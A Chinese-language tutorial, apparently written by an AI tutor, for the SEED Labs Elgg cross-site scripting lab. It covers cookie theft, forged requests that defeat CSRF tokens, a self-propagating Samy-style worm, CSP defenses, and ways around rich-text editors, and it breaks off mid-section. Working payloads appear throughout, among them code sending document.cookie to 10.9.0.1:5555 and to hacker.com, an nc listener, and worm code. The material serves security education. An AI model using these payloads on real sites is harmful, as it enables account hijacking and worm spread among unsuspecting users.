
# 第一部分：序章与核心基础 (Setup & Basics)

## 0. 实验背景：为什么我们要复现 "Samy Worm"？

*   **场景**：2005年，Samy Kamkar 在 MySpace 上写了一段代码，任何看他主页的人都会自动加他好友，并把这段代码传染给自己。20小时内感染了100万人。
*   **实验目标**：我们将在一个名为 **Elgg**（开源社交网络软件）的靶场中，复现这种**跨站脚本攻击 (XSS)**。
*   **核心逻辑**：
    1.  Web 应用程序（Elgg）**盲目信任**用户输入。
    2.  攻击者把**代码**（JavaScript）伪装成**数据**（比如自我介绍 text）。
    3.  受害者的浏览器无法区分，直接执行了这段代码。

---

## 1. 战场地形：Web 架构的具体化
**（考试重点：分清谁在执行代码，谁在存储代码）**

在这个实验中，有三个关键角色。请不要只把它们看作抽象概念，要记住它们的 IP 和功能：

1.  **客户端 (Browser / Victim)**：
    *   **位置**：你的 Ubuntu 虚拟机中的 Firefox 浏览器。
    *   **职责**：发送 HTTP 请求，**解析并执行**服务器返回的 HTML 和 **JavaScript**。
    *   **关键点**：**XSS 攻击的代码是在这里（受害者的浏览器里）运行的**，而不是在服务器上运行。

2.  **Web 服务器 (Server / Container)**：
    *   **IP地址**：`10.9.0.5`
    *   **域名**：`www.seed-server.com`
    *   **软件**：Apache + PHP + Elgg 应用。
    *   **职责**：接收请求，处理业务逻辑，把数据库里的内容拼凑成 HTML 发回给浏览器。

3.  **数据库 (Database)**：
    *   **IP地址**：`10.9.0.6`
    *   **软件**：MySQL。
    *   **职责**：存储用户数据（包括你的账号、密码、还有你注入的**恶意代码**）。

---

## 2. 核心概念落地：Cookie 与 Session
**（考试重点：这是我们要窃取的“皇冠上的宝石”）**

初学者常问：“Cookie 到底是什么？” 别只背定义，我们看它在 HTTP 报文里长什么样。

### 2.1 为什么需要 Cookie？
HTTP 协议是**无状态**的。你请求了页面 A，又请求页面 B，服务器不知道这俩请求都是你发的。
为了记住“你登录了”，服务器发给你一张“身份证”，这就是 Cookie。

### 2.2 具体的 Cookie 长什么样？
当您在实验中登录 Elgg 时，打开 Firefox 的 `F12` -> `Network`，你会看到如下具体的 Header：

**服务器发给浏览器的 (Set-Cookie):**
```http
HTTP/1.1 200 OK
Set-Cookie: Elgg=38djs93...; path=/; HttpOnly
```
*   `Elgg=...`：这是 Session ID。服务器在数据库里记着：“持有 ID 为 `38djs93...` 的人是用户 Alice”。

**浏览器发给服务器的 (Cookie):**
```http
GET /profile/alice HTTP/1.1
Host: www.seed-server.com
Cookie: Elgg=38djs93...
```
*   **具体落地**：每次你刷新页面，浏览器都会**自动**把这行 `Cookie: ...` 加在 HTTP 请求头里。

### 2.3 XSS 攻击的本质目标
攻击者的 JavaScript 代码运行在受害者的浏览器里，代码可以通过 DOM 对象访问 Cookie：
```javascript
var secret = document.cookie;
```
如果攻击者拿到了这个 `Elgg=38djs93...`，他就可以在自己的电脑上伪造一个 HTTP 请求，带上这个 Cookie，服务器就会误以为他是 Alice。**这就是 Session 劫持。**

---

## 3. 实验环境配置细节
**（考试/排错重点：配置不当，实验直接卡死）**

### 3.1 DNS 映射 (`/etc/hosts`)
实验文档要求你修改 `/etc/hosts`。
*   **原理**：浏览器不知道 `www.seed-server.com` 是谁。正常的 DNS 服务器（如 8.8.8.8）也不知道这个伪造的域名。
*   **操作**：
    ```bash
    10.9.0.5        www.seed-server.com
    ```
    这告诉 Linux 系统：“别去问 DNS 服务器了，我直接告诉你，`www.seed-server.com` 就是 `10.9.0.5`”。
*   **考试坑点**：如果你发现浏览器一直转圈，或者显示“连接被重置”，第一时间检查 `/etc/hosts` 是否拼写错误，或者 IP 是否对应 Docker 容器的 IP。

### 3.2 容器与网络
*   `docker-compose.yml` 定义了网络拓扑。
*   你需要知道你的攻击代码（JS）虽然是你写的，但最终是从 `10.9.0.5`（Server）发送到受害者浏览器的。

---

## 4. 必要的工具：HTTP Header Live & Inspector
**（实战重点：像医生看X光片一样看流量）**

在做任务之前，必须掌握如何“看”数据流。

### 4.1 GET vs POST
在 Web 攻击中，这两种请求方式有本质区别：

*   **GET 请求**：
    *   **样子**：参数在 URL 里。
    *   **例子**：`http://www.seed-server.com/friend/add?friend=123`
    *   **XSS利用**：很容易伪造。攻击者只需让受害者加载一张图片：`<img src="http://.../add?friend=123">`。

*   **POST 请求**：
    *   **样子**：参数在 HTTP Body 里（URL 看不到）。
    *   **例子**：修改个人资料（Profile）。
    *   **XSS利用**：较难。需要用 JavaScript 写一个 `XMLHttpRequest` (AJAX) 来模拟发送数据包。**这就是本实验任务 5 和 6 的核心难点。**

### 4.2 怎么看？
1.  点击 Firefox 右上角的 `HTTP Header Live` 插件。
2.  在 Elgg 网站上做一个操作（比如“添加好友”）。
3.  看插件里抓到的包。
4.  **找什么？**
    *   URL 是什么？
    *   是 GET 还是 POST？
    *   Parameters（参数）有哪些？（比如 `friend_guid=45`）
    *   **Token**：有没有看到 `__elgg_ts` 和 `__elgg_token`？（这是防御 CSRF 的，我们在 XSS 中需要用 JS 动态获取它们，这是任务难点）。

---

## 5. 总结：第一阶段知识清单 (Checklist)

在开始做 Task 1 之前，请确保您对以下问题能给出**具体的系统级答案**：

1.  **代码在哪运行？** -> JavaScript 在受害者的**浏览器**中运行，具有受害者的权限。
2.  **数据在哪存储？** -> 恶意代码作为“个人简介”存储在 MySQL **数据库**中。
3.  **我们要偷什么？** -> `document.cookie` 中的 Session ID。
4.  **我们怎么把数据传出去？** -> 让受害者的浏览器发起一个新的 HTTP 请求（比如请求一张攻击者服务器上的图片），把 Cookie 放在 URL 参数里带出去。
好的，我们继续。


# 第二部分：初次交锋 —— 注入与窃取 (Task 1-3)

## 1. 任务一：验证漏洞的存在 (The "Hello World" of XSS)

在任何攻击开始前，你需要证明漏洞是存在的。在 XSS 的世界里，`alert('XSS')` 就是程序员的 `Hello World`。

### 1.1 核心动作：存储型 XSS (Stored XSS)
在这个实验中，你使用的是 **Elgg** 社交网络。
*   **动作**：你（作为攻击者）在你的个人资料（Profile）里的 "Brief Description" 或 "About Me" 字段输入代码。
*   **系统行为**：
    1.  你点击保存 -> 浏览器发送 **POST** 请求。
    2.  服务器（`10.9.0.5`）接收数据，将其**存储**在 MySQL 数据库中（这就叫 **Stored** XSS，比反射型更危险，因为它是持久的）。
    3.  **关键时刻**：当**其他用户**（受害者）访问你的个人主页时，服务器从数据库取出这段数据，拼接到 HTML 页面中返回给受害者。
    4.  受害者的浏览器看到 `<script>` 标签，认为这是合法的程序，**立即执行**。

### 1.2 考试细节与实操坑点
**（非常重要，很多同学在这里卡住）**

1.  **坑点：编辑器模式 (Editor Mode)**
    *   Elgg 默认提供了一个富文本编辑器（像 Word 一样有加粗、斜体按钮）。
    *   如果你直接在编辑器里粘贴 `<script>...</script>`，编辑器会自作聪明地把 `<` 转换成 `&lt;`（HTML 实体编码）。
    *   **结果**：浏览器会把它当成纯文本显示出来，而不是代码执行。
    *   **解决**：必须点击编辑器右上角的 **"Edit HTML"**（通常是个小图标），进入**纯文本模式**（Text Mode），然后再粘贴代码。

2.  **代码分析**：
    ```html
    <script>alert('XSS');</script>
    ```
    或者引用外部脚本：
    ```html
    <script type="text/javascript" src="http://www.example.com/myscripts.js"></script>
    ```
    *   **考试概念**：为什么这里能运行？因为 Elgg 的开发者（在这个实验版本中）**注释掉了**输入过滤函数（`filter_tags` 和 `htmlspecialchars`）。如果防御开启，这些标签会被过滤或转义。

---

## 2. 任务二：接触敏感数据 (Accessing the Crown Jewels)

弹出一个窗口吓唬人并没有实际危害。现在的目标是证明我们能拿到钱（Cookie）。

### 2.1 DOM 对象的威力
浏览器提供了一个名为 **DOM (Document Object Model)** 的接口，让 JavaScript 可以操作页面内容。
*   **代码**：
    ```html
    <script>alert(document.cookie);</script>
    ```
*   **现象**：
    当受害者访问你的页面时，**受害者**的屏幕上会弹出一个框，显示类似 `Elgg=38djs93...` 的内容。
*   **逻辑**：这证明了你的恶意代码已经拥有了读取当前域（domain）下 Cookie 的权限。

### 2.2 局限性
这步仅仅是“自嗨”。受害者看到了自己的 Cookie，但你（攻击者）在你的电脑前，是看不到受害者屏幕上的弹窗的。我们需要把数据**发**出来。

---

## 3. 任务三：数据外泄 (Exfiltration / "Phone Home")

这是本节最精彩的部分：**如何让受害者的浏览器乖乖把 Cookie 发送到你的机器上？**

### 3.1 攻击原理：利用 `<img`> 标签
浏览器在解析 HTML 时，如果看到 `<img src="...">` 标签，会**自动、立即**向 `src` 指定的 URL 发起一个 **HTTP GET 请求**，试图下载图片。浏览器并不在乎这个 URL 是不是真的图片，它只会照做。

我们可以利用这一点，把 Cookie 拼接到 URL 参数里。

### 3.2 具体的代码构造
请仔细看这段实验代码，我们逐字解析：

```html
<script>
    document.write('<img src=http://10.9.0.1:5555?c=' + escape(document.cookie) + ' >');
</script>
```

1.  **`document.write(...)`**：这段 JS 会在当前页面的 HTML 里动态插入一行内容。
2.  **`http://10.9.0.1:5555`**：
    *   **IP**：这是**你（攻击者）** 的虚拟机 IP。
    *   **Port 5555**：这是你在攻击者机器上监听的端口。
3.  **`?c=`**：这是 HTTP GET 请求的参数。
4.  **`escape(document.cookie)`**：
    *   **考试细节**：为什么要用 `escape()`？
    *   因为 Cookie 里可能包含空格、分号 `;` 或等号 `=`。这些是 URL 里的特殊字符。如果不编码，HTTP 请求可能会断开或格式错误。`escape` 会把它们变成 `%3B` 这种形式。
5.  **`+`**：JavaScript 的字符串拼接符。

**最终受害者浏览器发出的请求长这样：**
`GET http://10.9.0.1:5555?c=Elgg%3Dzp6... HTTP/1.1`

### 3.3 攻击者端的接收 (Netcat)
作为攻击者，你需要一个服务器来接收这个请求。在这个实验里，我们用瑞士军刀 **Netcat (`nc`)**。

**命令**：
```bash
$ nc -lknv 5555
```
**参数详解（考试/排错重点）**：
*   **`-l` (listen)**：监听模式，作为服务器等待连接（而不是作为客户端去连接别人）。
*   **`-p 5555` (隐含)**：监听 5555 端口（有些版本 nc 不需要加 -p，直接跟端口号）。
*   **`-v` (verbose)**：详细模式。**一定要加**，否则有人连接你时，控制台什么都不显示，你会以为实验失败了。
*   **`-n` (no DNS)**：不要去解析 IP 的域名。能加快速度，避免 DNS 查询产生的延迟日志。
*   **`-k` (keep-alive)**：**关键参数**。
    *   如果不加 `-k`，第一个受害者连接后，nc 打印出请求就会**自动退出**。
    *   加上 `-k`，nc 会一直开着，可以接收多个受害者的 Cookie。

### 3.4 实验现象
1.  **攻击者**：在终端运行 `nc -lknv 5555`。
2.  **操作**：在 Alice 的账号里把恶意代码保存到 Profile。
3.  **受害者**：登录 Bob 的账号，访问 Alice 的 Profile。
4.  **结果**：
    *   Bob 的浏览器可能会显示一个破裂的图片图标（因为 `10.9.0.1:5555` 并没有返回真正的图片数据）。
    *   **攻击者终端**：你会看到类似如下的输出：
        ```
        Connection from 10.9.0.5:xxxx
        GET /?c=Elgg%3D89s8df8s9df8... HTTP/1.1
        ...
        ```
    *   那个 `c=` 后面的乱码，就是 Bob 的 Session Cookie！

---

## 4. 总结：第二阶段知识清单

在进入更复杂的“蠕虫”编写之前，请确认你完全理解了以下流程：

1.  **注入**：利用“Edit HTML”模式绕过编辑器干扰，将 JS 存入 DB。
2.  **触发**：受害者浏览器被动执行 JS。
3.  **外传**：
    *   **手段**：`new Image().src` 或者 `document.write('<img...')`。
    *   **协议**：HTTP GET。
    *   **接收**：`nc` 监听端口。
4.  **关键数据**：`document.cookie` 是核心资产，`escape()` 是为了保证传输格式正确。

好的，让我们继续深入。

如果说 Task 1-3 只是“偷窥”（读取数据），那么 **Task 4 和 Task 5** 就是“夺舍”（伪造行为）。

这是 XSS 攻击中最危险的阶段：**攻击者利用受害者的身份，在受害者不知情的情况下，向服务器发送指令。** 这正是 2005 年 Samy Worm 让一百万人自动加好友的核心原理。

---

# 第三部分：从“偷窥”到“夺舍” (Task 4 & 5)

## 1. 核心概念：AJAX 与 伪造请求
**（考试重点：理解为什么要在 JS 里写 HTTP 请求）**

在正常的网页操作中，当你点击“添加好友”按钮时，**浏览器**会帮你构造一个 HTTP 请求发给服务器。
在 XSS 攻击中，因为我们不能指望受害者主动去点按钮，所以我们需要用 **JavaScript 代码** 来模拟这个过程。这就是 **AJAX (Asynchronous JavaScript and XML)** 技术。

**简单来说：** 我们要写一段 JS 代码，它在后台悄悄地通过网络线跟服务器说话：“我是当前用户，请把 Samy 加为好友。”

---

## 2. 任务四：成为受害者的“好友” (Task 4)

### 2.1 第一步：侦察 (Reconnaissance)
在写代码之前，你必须先知道“正确的请求”长什么样。这就轮到 **HTTP Header Live** 出场了。

1.  **操作**：登录一个普通账号（比如 Alice），手动去加 Samy 为好友。
2.  **观察**：在插件里看抓到的包。
3.  **分析结构**：
    *   **URL**: `http://www.seed-server.com/action/friends/add`
    *   **Parameters (参数)**:
        *   `friend`: `47` (假设这是 Samy 的用户 ID，即 GUID)。
        *   `__elgg_ts`: `16039...` (时间戳)。
        *   `__elgg_token`: `89d8f...` (安全令牌)。

### 2.2 核心难点：CSRF 防御令牌 (`ts` & `token`)
**（考试/面试绝对核心点：XSS 如何绕过 CSRF 保护？）**

你会发现请求里有两个奇怪的参数：`__elgg_ts` 和 `__elgg_token`。
*   **这是什么？** 这是 Elgg 为了防止 **CSRF (跨站请求伪造)** 攻击而设计的。服务器每次生成页面时，都会随机生成这两个值藏在页面里。如果请求里不带这两个正确的值，服务器就会拒绝请求。
*   **为什么 XSS 能搞定它？**
    *   传统的 CSRF 攻击（比如发个钓鱼链接）是拿不到这两个值的，因为它们藏在受害者的页面源代码里。
    *   但是！**XSS 代码是运行在受害者页面内部的**。
    *   **结论**：因为代码在“内部”，所以我们可以直接通过 JavaScript 的 DOM 树读取当前页面上的这两个变量！

**代码中的体现：**
```javascript
// 直接从 Elgg 的全局 JavaScript 对象中读取这两个秘密值
var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
```
*这行代码证明了：在 XSS 面前，CSRF 防御形同虚设。*

### 2.3 代码构建与填空
实验手册给出的代码框架是这样的，我们要填空：

```javascript
<script type="text/javascript">
window.onload = function () {
    // 1. 准备 AJAX 对象
    var Ajax=null;
    
    // 2. 窃取当前页面的防御令牌 (Action Tokens)
    var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
    var token="&__elgg_token="+elgg.security.token.__elgg_token;

    // 3. 构建 URL (填空重点)
    // 格式必须和你在侦察阶段看到的一模一样
    // 假设 Samy 的 GUID 是 47 (你需要自己在数据库或页面源码里确认 Samy 的 GUID)
    var sendurl="http://www.seed-server.com/action/friends/add?friend=47" + ts + token; 

    // 4. 发送请求
    Ajax=new XMLHttpRequest();
    Ajax.open("GET", sendurl, true);
    Ajax.send();
}
</script>
```

*   **问题解答 (Question 1)**: 第192/193行（读取 ts 和 token）的目的是什么？
    *   **答**：为了绕过 Elgg 的 CSRF 防御机制。如果不带上这两个与当前会话匹配的动态令牌，服务器会拒绝“添加好友”的请求。

*   **问题解答 (Question 2)**: 如果只能用 Editor Mode（富文本编辑器），能成功吗？
    *   **答**：**不能**。因为富文本编辑器会将 `<script>` 标签转义为 `&lt;script&gt;`，导致代码被当作普通文本显示，而不会被浏览器执行。

---

## 3. 任务五：修改受害者的资料 (Task 5)

这步比加好友更进一步。加好友通常是 **GET** 请求，而修改资料通常是 **POST** 请求，且数据量更大。

### 3.1 侦察 POST 请求
手动修改一次资料，观察 HTTP Header Live：
*   **Method**: `POST`
*   **URL**: `http://www.seed-server.com/action/profile/edit`
*   **Data (Payload)**: 包含一大堆字段，如 `description`, `name`, `accesslevel` 等，当然还有 `ts` 和 `token`。

### 3.2 代码构建的差异
我们在 JS 中发送 POST 请求比 GET 稍微复杂一点：

1.  **Header 设置**：必须告诉服务器我们在发送表单数据。
    ```javascript
    Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    ```
2.  **内容构建 (`content` 变量)**：
    你需要把侦察到的所有参数拼接成一个长字符串。
    ```javascript
    var content = "__elgg_token=" + elgg.security.token.__elgg_token;
    content += "&__elgg_ts=" + elgg.security.token.__elgg_ts;
    content += "&name=" + elgg.session.user.name; // 保持受害者原来的名字
    content += "&description=I am hacked by Samy!"; // 修改受害者的简介
    content += "&guid=" + elgg.session.user.guid; // 受害者的 ID
    // ... 可能还需要其他必须的字段，如 accesslevel 等，视实验环境具体抓包结果而定
    ```

### 3.3 关键逻辑：自我保护 (Question 3)
实验代码中有一行非常关键的判断：

```javascript
if(elgg.session.user.guid != samyGuid) {
    // 发送攻击请求
}
```

*   **这是什么意思？**：判断“当前登录的用户”是不是“Samy自己”。
*   **为什么需要？**：
    *   攻击代码是写在 Samy 的主页里的。
    *   Samy 自己也会访问自己的主页。
    *   如果不加这行判断，Samy 访问自己主页时，浏览器就会执行代码，把 Samy 自己的资料改成 "I am hacked by Samy!"。
    *   更糟糕的是，如果这是蠕虫（Task 6），Samy 会无限次感染自己，导致浏览器陷入死循环崩溃，或者把数据库撑爆。
*   **问题 3 答案**：如果删除这一行，Samy 访问自己页面时，自己的资料会被篡改。这在蠕虫开发中叫“**自杀**”。

---

## 4. 总结：第三阶段知识清单

在进入最终 Boss（Task 6 自我复制的蠕虫）之前，请确保理解以下区别：

| 特性 | Task 4 (加好友) | Task 5 (改资料) |
| :--- | :--- | :--- |
| **请求方法** | GET | POST |
| **参数位置** | URL 中 | Body (send 函数的参数) 中 |
| **Header** | 默认即可 | 需设置 `Content-Type: application/x-www-form-urlencoded` |
| **复杂性** | 简单拼接 URL | 需拼接大量 Body 字符串 |
| **共同点** | **都必须从 DOM 中动态获取 CSRF Token (`ts` & `token`) 才能成功** |

### 下一步预告
现在我们已经能：
1.  弹窗。
2.  偷 Cookie。
3.  帮受害者加好友。
4.  帮受害者改资料。

但是，这还只是“一次性”攻击。如果 Bob 被攻击了，Charlie 访问 Bob 的页面是没事的。
好，这是本次实验最硬核的部分，也是 XSS 攻击的终极形态。

如果在 Task 5 中，你只是“改了别人的资料”，那么在 Task 6 中，你要让这份“被篡改的资料”变成**有生命的病毒**。

---

# 第四部分：终极形态 —— 自我复制的蠕虫 (Task 6)

## 1. 核心概念：什么是“自我复制”？
**（考试概念：Quine 程序）**

Samy 蠕虫之所以可怕，不是因为它改了资料，而是因为它具有传染性。
*   **普通攻击 (Task 5)**：Samy 攻击了 Alice。Alice 的主页坏了。Bob 访问 Alice，Bob 没事。
*   **蠕虫攻击 (Task 6)**：Samy 攻击了 Alice。Alice 的主页被植入了**恶意代码**。Bob 访问 Alice，Bob 的浏览器执行了 Alice 主页里的恶意代码，于是 Bob 的主页也被植入了**恶意代码**。Charlie 访问 Bob... 呈指数级扩散。

**技术难点**：恶意代码在执行“修改资料”这个动作时，必须**把自己源代码的副本**作为新资料的一部分，填入到 POST 请求的参数里。

这在编程中被称为 **Quine**（自产生程序）：一段能输出自身源代码的程序。

---

## 2. DOM 方法：代码如何“读取自己”？
**（实操/代码填空核心）**

实验要求使用 **DOM 方法**。这意味着代码本身必须包含在页面中，并且能通过 DOM API 找到并复制自己。

### 2.1 代码剖析
让我们逐行拆解这段核心逻辑（请对照实验手册的代码）：

```javascript
<script id="worm"> // 注意：必须给 script 标签一个 ID，为了让 JS 能找到它自己
    var headerTag = "<script id=\"worm\" type=\"text/javascript\">"; 
    var jsCode = document.getElementById("worm").innerHTML; // 核心 1
    var tailTag = "</" + "script>"; // 核心 2
   
    // 核心 3：把这三部分拼起来，并进行编码
    var wormCode = encodeURIComponent(headerTag + jsCode + tailTag); 
      
    // 接下来：构造 Task 5 中的 POST 请求
    var desc = "&description=Samy is my hero" + wormCode;
    // ... 发送 AJAX 请求 ...
</script>
```

### 2.2 关键点详解（考试常考）

1.  **`document.getElementById("worm").innerHTML`**：
    *   这行代码获取的是 `<script>` 标签**中间**的内容（即 JS 代码本身）。
    *   **坑点**：它**不包含**外面的 `<script id="worm">` 和 `</script>` 标签。
    *   所以，我们需要手动定义 `headerTag` 和 `tailTag` 把它们包回去，否则复制过去的就只是文本，不是可执行的代码了。

2.  **`tailTag` 的写法**：
    *   为什么写成 `"</" + "script>"` 而不是直接 `"</script>"`？
    *   **原理**：如果直接写 `</script>`，浏览器在解析这段恶意代码时，会误以为这是当前脚本的结束标签，导致脚本提前中断，报错。拆开写可以欺骗解析器。

3.  **`encodeURIComponent(...)` (重中之重)**：
    *   **为什么必须编码？**
    *   你的蠕虫代码里充满了特殊字符：`+`, `=`, `&`, `;`, `"`, `<`。
    *   我们是要把这段代码作为 **POST 请求的一个参数** (`description=...`) 发送给服务器。
    *   在 HTTP POST Body (`application/x-www-form-urlencoded`) 中，`&` 符号代表“下一个参数的开始”。
    *   **后果**：如果你不编码，代码里的 `&` 会把参数截断，服务器收到的代码是残缺的，蠕虫就死了。
    *   `encodeURIComponent` 会把这些符号变成 `%26`, `%3D` 等，确保它们被当作**数据**而不是**控制字符**传输。

---

## 3. 验证蠕虫是否工作
1.  **零号病人**：把完整代码（Task 5 的逻辑 + Task 6 的自我复制逻辑）放入 Samy 的 Profile。
2.  **感染 Alice**：登录 Alice，访问 Samy。检查 Alice 的 Profile，你会发现 Alice 的 Description 变成了恶意代码。
3.  **感染 Bob**：登录 Bob，访问 **Alice**（注意是访问 Alice，不是 Samy）。如果 Bob 的 Profile 也变成了恶意代码，恭喜你，你制造了一个蠕虫。

---

# 第五部分：防御篇 —— 内容安全策略 (Task 7 / CSP)

攻防是相辅相成的。我们把 Web 世界搞得天翻地覆，现在该学学怎么防守了。

## 1. XSS 的根源与 CSP 的解法
**（概念核心）**

*   **XSS 的根源**：浏览器**盲目信任**服务器发来的所有内容。它分不清哪段 JS 是开发者写的（好人），哪段是黑客注入的（坏人）。
*   **CSP (Content Security Policy)**：这是一种**白名单**机制。服务器通过 HTTP Header 告诉浏览器：“只许执行来自 A、B、C 来源的代码，其他一律拦截。”

---

## 2. 实验环境分析
实验提供了几个网站（`example32a/b/c`）和几个 JS 来源（`example60/70`）。

### 2.1 CSP 策略长什么样？
在 `apache_csp.conf` 或 PHP 代码中，你会看到：

```http
Content-Security-Policy: default-src 'self'; script-src 'self' *.example70.com
```

*   **`default-src 'self'`**：默认情况下，只加载同源（同一个域名、同一个端口）的资源。
*   **`script-src ...`**：对于 JavaScript，允许同源，**以及**来自 `*.example70.com` 的代码。
*   这意味着：来自 `example60.com` 的代码会被**拦截**。

### 2.2 实验任务解析

1.  **观察 (Observation)**：
    *   访问网页时，你应该会看到 Console（F12 控制台）里一片红。
    *   报错信息类似：`Refused to execute inline script because it violates the following Content Security Policy...`
    *   这说明 CSP 正在工作。

2.  **Nonce (Number used ONCE)**：
    *   **场景**：有时候我们确实需要写 `<script>...</script>` 这种内嵌代码，但 CSP 禁止内嵌（为了防 XSS）。怎么办？
    *   **解法**：给这段代码发个“通行证”。
    *   **Server**：`Content-Security-Policy: script-src 'nonce-111-111-111'`
    *   **HTML**：`<script nonce="111-111-111"> alert('ok') </script>`
    *   **原理**：只有当 HTML 标签里的 nonce 和 HTTP 头里的 nonce **完全一致**时，代码才运行。攻击者注入代码时，因为不知道这个随机的 nonce 值，所以注入的代码会被拦截。

3.  **修改 Apache 配置 (Q3)**：
    *   目标：让 `example60` 的脚本也能运行。
    *   操作：修改配置文件，在 `script-src` 后面加上 `www.example60.com`。
    *   **重点**：CSP 是白名单，缺谁加谁。

4.  **修改 PHP 代码 (Q4)**：
    *   PHP 也可以发送 Header。
    *   任务要求让所有区域都 OK。你需要：
        *   添加 `nonce` 允许内嵌代码。
        *   添加所有外部域名（example60, example70）到白名单。

---

## 3. 总结：全实验回顾与备考指南

恭喜你，完成了从入门到入狱再到狱警（防御）的全过程。以下是**考试前必须能在脑海中复述的知识点**：

1.  **XSS 原理**：代码注入 -> 存储/反射 -> 浏览器解析执行。
2.  **Cookie 窃取**：`document.cookie` + `new Image().src` + `nc -lknv`。
3.  **Ajax 请求伪造**：
    *   **GET**：简单 URL 拼接。
    *   **POST**：需要 `XMLHttpRequest` 和 `Content-Type`。
    *   **CSRF Token**：XSS 攻击可以通过 DOM 读取 `__elgg_ts` 和 `__elgg_token` 来绕过 CSRF 保护。
4.  **Samy Worm (难点)**：
    *   **DOM 读取自身**：`innerHTML`。
    *   **拼凑标签**：手动加 `<script>`。
    *   **URL 编码**：`encodeURIComponent` 防止 `&` 截断 POST 参数。
5.  **CSP 防御**：
    *   **核心**：白名单机制，分离代码与数据。
    *   **指令**：`script-src` 控制 JS 来源。
    *   **Nonce**：允许特定的内嵌脚本执行。

希望这份详细的讲解能帮你在考试和作业中拿到高分！如果有具体的代码报错或细节卡住，随时可以把报错信息发给我。祝实验顺利！

# 补充：对比持久和非持久

XSS 的核心都在于：**浏览器分不清哪些是服务器发的“指令”（脚本），哪些是用户发的“数据”（文本）。

---

### 1. Reflected XSS (反射型 / 非持久型)
**关键词**：即时、一次性、钓鱼链接、不进数据库。

#### 核心机制
攻击代码**不存储**在服务器上。
它像照镜子一样：你给服务器发过去一个恶意的请求，服务器**立刻**把它“反射”回来给你（或受害者）。

#### 实际代码例子 (PHP Search Box)
这是最典型的场景：**搜索框**。

**不安全的服务端代码 (`search.php`)：**
```php
<?php
// 极度危险：直接把用户输入的 'q' 参数原样打印回页面
$query = $_GET['q'];
echo "您搜索的内容是: " . $query; 
?>
```

#### 攻击流程
1.  **构造陷阱**：攻击者构造一个恶意链接，把脚本藏在 URL 参数里。
    ```text
    http://example.com/search.php?q=<script>alert('偷你Cookie')</script>
    ```
2.  **诱导触发**：攻击者通过邮件、微信发送这个链接给受害者（Alice）。
3.  **反射执行**：
    *   Alice 点击链接。
    *   请求发给服务器。
    *   服务器**没存**这个脚本，只是把 `q` 的内容拼接到 HTML 里返回：`您搜索的内容是: <script>alert('...')</script>`。
    *   Alice 的浏览器收到响应，执行脚本，Cookie 被盗。

**比喻**：拿激光笔照镜子。光（恶意代码）打过去，马上反弹回来刺瞎眼睛。镜子本身不发光。

---

### 2. Persistent XSS (存储型 / 持久型)
**关键词**：数据库、永久危害、无需链接、Samy Worm。

#### 核心机制
攻击代码**存储**在服务器的数据库或文件系统中。
这是**地雷**：攻击者埋一次，以后任何人路过都会被炸。

#### 实际代码例子 (留言板 / Elgg Profile)
这是 SEED Lab 的场景：**个人简介**或**论坛留言**。

**不安全的服务端代码 (`profile.php`)：**

**第一步：存入 (Save)**
```php
// 攻击者提交简介，服务器将其存入 MySQL 数据库
$bio = $_POST['bio']; 
$sql = "INSERT INTO profiles (description) VALUES ('$bio')";
$db->query($sql);
```

**第二步：读出 (Load)**
```php
// 受害者访问页面，服务器从数据库取出内容，不经处理直接显示
$sql = "SELECT description FROM profiles WHERE user='Samy'";
$result = $db->query($sql);
echo "个人简介: " . $result['description'];
```

#### 攻击流程
1.  **埋雷**：攻击者（Samy）在自己的“个人简介”输入框里填入：
    ```html
    大家好！<script>window.location='http://hacker.com?cookie='+document.cookie</script>
    ```
2.  **存储**：这段代码被**永久保存**在网站的数据库里。
3.  **大面积杀伤**：
    *   受害者 A 访问 Samy 主页 -> 数据库取出脚本 -> A 的浏览器执行 -> A 被盗号。
    *   受害者 B 访问 Samy 主页 -> 数据库取出脚本 -> B 的浏览器执行 -> B 被盗号。
    *   不需要受害者点击任何奇怪的链接，只要正常浏览网站就会中招。

**比喻**：在墙上喷涂鸦。喷一次，之后路过的每一千、一万个人都能看到（被执行）。

---

### 3. 终极对比 (Exam Cheat Sheet)

| 特性 | Reflected XSS (反射型) | Persistent XSS (存储型) |
| :--- | :--- | :--- |
| **数据流向** | 浏览器 -> 服务器 -> 浏览器 (立即) | 浏览器 -> 服务器(数据库) -> 浏览器 (稍后/多次) |
| **持久性** | **临时** (一次 HTTP 请求周期) | **永久** (直到管理员删库) |
| **触发条件** | 受害者必须**点击特定链接** | 受害者只需**访问正常页面** |
| **攻击范围** | 点链接的人 (点对点) | 所有访问该页面的用户 (点对多) |
| **常见场景** | 搜索框、错误信息页面 | 留言板、个人资料、私信 |
| **SEED Lab** | 没涉及 | **Task 1-6 全是这个 (Elgg Profile)** |

### 总结
*   **Reflected** 是“如果你点这个链接，你就完蛋了”。
*   **Persistent** 是“如果你来这个网站，你就完蛋了”。
*   在 SEED 实验中，之所以能做成蠕虫（Worm），正是因为利用了 **Persistent XSS** 的特性：代码存在数据库里，受害者被感染后，又把代码写回数据库，循环往复。
  
# 小补充：如何越过富文本编辑器


这是一个非常经典的问题，也是 Web 安全攻防中**“客户端不可信”**原则的最佳演示。

如果 Web 界面（UI）限制了你，比如没有“HTML 模式”或者输入框限制了长度，请永远记住一句话：**浏览器是你的，发出的 HTTP 请求也是你的。你完全可以绕过浏览器界面，直接构造请求。**

以下是 4 种绕过富文本编辑器（WYSIWYG Editor）限制的方法，按推荐程度排序：

---

	### 方法一：直接修改 DOM（最常用，无需额外工具）

绝大多数富文本编辑器的工作原理是：显示一个漂亮的编辑框给你看，但实际提交表单时，它会把内容同步到一个**隐藏的** `<textarea>` 或 `<input>` 标签里。

**操作步骤：**

1.  **右键检查 (Inspect)**：在那个富文本编辑框上右键，点击“检查元素” (Inspect Element)。
2.  **寻找隐藏的输入框**：在 HTML 源代码（DOM树）里找一下。通常在编辑器 `<div>` 的附近，你会发现一个 `display: none` 或者 `hidden` 属性的 `<textarea>` 或 `<input>` 标签。
    *   *提示：它的 `name` 属性通常就是 `description` 或 `body`。*
3.  **修改它**：
    *   双击这个隐藏标签的内容部分。
    *   直接把你的 Payload（如 `<script>alert(1)</script>`）粘贴进去。
    *   或者，把它的 `display: none` 删掉，让它显示出来，然后直接在里面打字。
4.  **提交**：点击页面上的“保存”按钮。表单会提交这个隐藏标签里的值，而不是编辑器里那个“经过处理”的值。

---

### 方法二：利用开发者工具“重放”请求（最稳健）

